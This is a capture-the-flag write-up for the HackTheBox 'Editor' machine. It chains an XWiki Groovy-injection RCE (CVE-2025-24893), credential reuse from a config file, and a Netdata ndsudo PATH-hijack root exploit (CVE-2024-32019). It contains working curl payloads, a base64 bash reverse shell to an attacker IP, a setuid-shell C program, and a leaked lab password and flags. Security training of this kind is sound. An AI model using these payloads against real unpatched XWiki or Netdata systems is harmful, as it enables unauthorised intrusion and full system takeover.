---
layout: writeup
title: "Editor - Linux Easy Machine"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
date: 2025-12-08
tags: [xwiki, rce, groovy-injection, password-reuse, path-hijacking, netdata, cve-2025-24893, cve-2024-32019]
excerpt: "Exploiting XWiki SolrSearch Groovy injection for RCE, credential reuse for lateral movement, and PATH hijacking in Netdata's ndsudo for root."
---

# Editor - HackTheBox Writeup

---

## Summary

Editor is a medium-difficulty Linux machine featuring an XWiki instance vulnerable to unauthenticated Remote Code Execution (CVE-2025-24893). Initial access is obtained through Groovy code injection in the SolrSearch endpoint. Privilege escalation to user involves extracting MySQL credentials from XWiki's configuration files, which are reused for SSH access. Root is achieved by exploiting CVE-2024-32019, a PATH hijacking vulnerability in Netdata's ndsudo SUID binary.

---

## Phase 1: Reconnaissance

### Port Scanning

Initial reconnaissance reveals three open ports:

```bash
nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.11.80
```

| Port | Service | Details |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 80 | HTTP | nginx 1.18.0 → Redirects to editor.htb |
| 8080 | HTTP | Jetty 10.0.20 → XWiki |

### Service Enumeration

Detailed service scan on discovered ports:

```bash
nmap -p22,80,8080 -sCV -Pn -n 10.10.11.80
```

Key findings:

- **Port 80:** nginx redirecting to `http://editor.htb/` (add to `/etc/hosts`)
- **Port 8080:** XWiki running on Jetty with WebDAV methods enabled (PROPFIND, LOCK, UNLOCK)
- **robots.txt:** Exposes 50+ XWiki endpoints

The application footer reveals the exact version: **XWiki Debian 15.10.8**

---

## Phase 2: Foothold - CVE-2025-24893

### Vulnerability Identification

XWiki 15.10.8 is vulnerable to **CVE-2025-24893**, an unauthenticated Remote Code Execution vulnerability. The flaw exists in the SolrSearch endpoint, which fails to sanitize user input before processing it as Groovy code.

**Affected endpoint:** `/xwiki/bin/get/Main/SolrSearch`

The vulnerability allows injection of Groovy code through the `text` parameter when requesting RSS output.

### Proof of Concept

Testing code execution with a simple arithmetic operation:

```bash
curl -s "http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss" \
  --data-urlencode "text=}}}{{async}}{{groovy}}println(23+19){{/groovy}}{{/async}}"
```

The response contains `42` in the RSS title, confirming code execution:

```xml
<title>RSS feed for search on [}}}42]</title>
```

### Command Execution Verification

Escalating to system command execution:

```bash
curl -s "http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss" \
  --data-urlencode "text=}}}{{async}}{{groovy}}println('id'.execute().text){{/groovy}}{{/async}}"
```

**Result:** `uid=997(xwiki) gid=997(xwiki) groups=997(xwiki)`

### Reverse Shell

With confirmed RCE, establishing a reverse shell:

**1. Start listener on attacker machine:**

```bash
nc -lvnp 4444
```

**2. Generate base64-encoded payload:**

```bash
echo -n "bash -i >& /dev/tcp/10.10.14.85/4444 0>&1" | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44NS80NDQ0IDA+JjE=
```

**3. Execute the payload:**

```bash
curl -s "http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss" \
  --data-urlencode "text=}}}{{async}}{{groovy}}new ProcessBuilder(['bash','-c',
  'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44NS80NDQ0IDA+JjE= | base64 -d | bash'])
  .start(){{/groovy}}{{/async}}"
```

Shell received as `xwiki` user inside a container.

---

## Phase 3: User - Password Reuse

### Configuration File Enumeration

From the XWiki container, searching for configuration files containing credentials:

```bash
cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
```

The Hibernate configuration reveals MySQL database credentials:

```xml
<property name="hibernate.connection.username">xwiki</property>
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

### User Discovery

Checking `/etc/passwd` for system users with shell access:

```bash
cat /etc/passwd | grep bash
```

Found: `oliver:x:1000:1000:,,,:/home/oliver:/bin/bash`

### SSH Access

Testing credential reuse with the discovered password:

```bash
ssh oliver@10.10.11.80
Password: theEd1t0rTeam99
```

**User flag:** `dbd25971916d7330771cd54aeb1c466b`

---

## Phase 4: Root - CVE-2024-32019

### Privilege Enumeration

Checking user groups and permissions:

```bash
$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

The user belongs to the **netdata** group. Searching for SUID binaries accessible by this group:

```bash
$ ls -la /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata 200576 Apr 1 2024 ndsudo
```

### Vulnerability Analysis

**CVE-2024-32019** is a local privilege escalation vulnerability in Netdata's `ndsudo` binary. The flaw exists because:

1. `ndsudo` is a SUID root binary
2. It executes whitelisted commands (like `nvme`, `smartctl`)
3. It resolves these commands using the user's `$PATH` instead of absolute paths

This allows an attacker to place a malicious binary in a directory they control, prepend that directory to `$PATH`, and have `ndsudo` execute their binary with root privileges.

**Whitelisted commands:**

```bash
strings /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo | grep -E "^[a-z]+-"
```

```
nvme-list
nvme-smart-log
megacli-disk-info
megacli-battery-info
arcconf-ld-info
arcconf-pd-info
```

### Exploitation

**1. Create malicious binary on attacker machine:**

```c
// nvme.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

**2. Compile with static linking:**

```bash
gcc nvme.c -o nvme -static
```

**3. Transfer to target:**

```bash
scp nvme oliver@10.10.11.80:/tmp/
```

**4. Execute the attack:**

```bash
chmod +x /tmp/nvme
PATH=/tmp:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

**5. Verify root access:**

```bash
# whoami
root
```

**Root flag:** `d084fb1e995354a1630c53ea48d88b3e`

---

## Attack Chain Summary

| Phase | Technique | Details |
|-------|-----------|---------|
| **Recon** | Nmap | Ports 22, 80, 8080 (XWiki 15.10.8) |
| **Foothold** | CVE-2025-24893 | Unauthenticated RCE via SolrSearch Groovy injection |
| **User** | Password Reuse | MySQL credentials from hibernate.cfg.xml → SSH as oliver |
| **Root** | CVE-2024-32019 | PATH hijacking in ndsudo SUID binary |

---

## Key Takeaways

### CVE-2025-24893 - XWiki SolrSearch RCE

- **Affected versions:** XWiki < 15.10.11, < 16.4.1, < 16.5.0RC1
- **Impact:** Unauthenticated attackers can execute arbitrary code
- **Root cause:** Unsanitized user input processed as Groovy code
- **Mitigation:** Update to patched versions

### CVE-2024-32019 - Netdata ndsudo Privilege Escalation

- **Affected versions:** Netdata >= 1.44.0-60 and < 1.45.3
- **Impact:** Local privilege escalation to root
- **Root cause:** SUID binary resolves commands via user-controlled PATH
- **Mitigation:** Update Netdata or remove ndsudo SUID bit

---

## References

- [CVE-2025-24893 - XWiki SolrSearch RCE](https://github.com/xwiki/xwiki-platform/security/advisories)
- [CVE-2024-32019 - Netdata ndsudo Privilege Escalation](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)
- [XWiki Security Advisories](https://www.xwiki.org/xwiki/bin/view/Security/)
- [Netdata Security Advisories](https://github.com/netdata/netdata/security)
